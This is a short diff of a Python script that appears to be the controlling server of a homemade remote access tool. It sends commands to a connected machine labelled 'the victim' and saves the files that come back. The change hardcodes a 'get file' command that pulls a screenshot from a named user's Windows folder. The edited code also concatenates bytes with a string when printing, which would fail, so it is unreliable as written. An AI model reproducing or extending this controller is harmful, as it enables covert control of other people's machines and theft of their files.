@@ -9,13 +9,14 @@ def server():
     client_socket, adress = s.accept()
     print("Connection from: " + str(adress))
     while True:
-        command = input('Please enter a command to the victim')
+        command = "get file C:\\Users\\avita\\OneDrive\\Pictures\\Screenshots\\test.png"
+        #input('Please enter a command to the victim')
         client_socket.send(command.encode('utf-8'))
-        data = client_socket.recv(1024).decode('utf-8')
+        data = client_socket.recv(1024)
         if 'get file ' in command:
-            file_path = input("Please enter the path of the file")
+            file_path = "C:\\Users\\avita\\OneDrive\\Pictures\\Screenshots\\n.png" #input("Please enter the path of the file")
             with open(file_path, 'wb')as f:
-                f.write(data.encode('utf-8'))
+                f.write(data)
 
         print('From victim: ' + data)
     client_socket.close()
